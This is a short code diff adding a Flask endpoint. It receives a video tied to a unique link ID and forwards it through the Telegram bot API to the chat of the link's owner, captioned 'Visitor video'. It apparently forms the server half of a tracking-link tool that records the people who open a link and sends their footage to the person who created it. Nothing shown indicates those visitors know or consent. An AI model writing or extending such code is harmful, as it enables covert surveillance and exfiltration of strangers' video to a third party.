@@ -1,0 +1,17 @@
+@app.route('/upload_video/<unique_id>', methods=['POST'])
+def upload_video(unique_id):
+    if unique_id not in link_data:
+        return {"status": "error"}, 400
+    owner_id = link_data[unique_id]["owner"]
+    if 'video' not in request.files:
+        return {"status": "error"}, 400
+    video_file = request.files['video']
+    temp_file = f"temp_video_{unique_id}.webm"
+    video_file.save(temp_file)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
+    with open(temp_file, 'rb') as vid:
+        files = {'video': vid}
+        payload = {'chat_id': owner_id, 'caption': '🎥 Visitor video'}
+        resp = requests.post(url, files=files, data=payload)
+    os.remove(temp_file)
+    return {"status": "ok"}, 200 if resp.status_code == 200 else 500
